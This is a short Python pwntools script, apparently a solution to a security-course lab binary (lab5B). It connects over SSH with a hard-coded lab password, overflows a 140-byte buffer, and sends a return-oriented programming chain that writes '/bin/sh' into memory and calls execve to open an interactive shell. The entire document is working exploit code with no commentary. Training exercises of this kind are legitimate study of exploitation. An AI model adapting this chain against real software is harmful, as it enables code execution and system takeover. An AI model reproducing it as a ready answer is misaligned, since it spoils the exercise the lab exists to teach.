from pwn import *

s = ssh(host = '192.168.147.134', user = 'lab5B', password = 's0m3tim3s_r3t2libC_1s_3n0ugh')

r = s.process("/levels/lab05/lab5B")
pop_eax = 0x080bbf26 # pop eax ; ret
pop_ebx = 0x080481c9 # pop ebx ; ret
pop_ecx = 0x080e55ad # pop ecx ; ret
pop_edx = 0x0806ec5a # pop edx ; ret
mov_ptr_edx_eax = 0x0809a95d # mov dword ptr [edx], eax ; ret
int_0x80 = 0x08049401 # int 0x80
payload = b'A' * 140
payload += p32(pop_eax)
payload += b'/bin'
payload += p32(pop_edx)
payload += p32(0x080ebf80) #bss
payload += p32(mov_ptr_edx_eax)
payload += p32(pop_eax)
payload += b'/sh\x00'
payload += p32(pop_edx)
payload += p32(0x080ebf80 + 4) #bss + 4
payload += p32(mov_ptr_edx_eax)
payload += p32(pop_eax)
payload += p32(11)
payload += p32(pop_ebx)
payload += p32(0x080ebf80)
payload += p32(pop_ecx)
payload += p32(0)
payload += p32(pop_edx)
payload += p32(0)
payload += p32(int_0x80) #execve('/bin/sh', 0, 0)
r.sendline(payload)
r.interactive()
